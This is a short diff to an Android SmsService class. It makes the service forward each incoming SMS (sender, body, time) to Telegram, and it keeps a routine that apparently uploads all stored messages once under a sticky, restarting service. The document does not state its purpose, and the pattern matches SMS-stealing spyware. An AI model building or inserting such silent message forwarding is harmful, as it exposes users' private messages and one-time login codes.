@@ -73,9 +73,16 @@ public class SmsService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!oldSmsSent) {
-            oldSmsSent = true;
-            new Thread(this::sendAllOldSms).start();
+        if (intent != null && intent.hasExtra("sms_sender")) {
+            String sender = intent.getStringExtra("sms_sender");
+            String body   = intent.getStringExtra("sms_body");
+            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
+            new Thread(() -> sendToTelegram(this, sender, body, time)).start();
+        } else {
+            if (!oldSmsSent) {
+                oldSmsSent = true;
+                new Thread(this::sendAllOldSms).start();
+            }
         }
         return START_STICKY;
     }
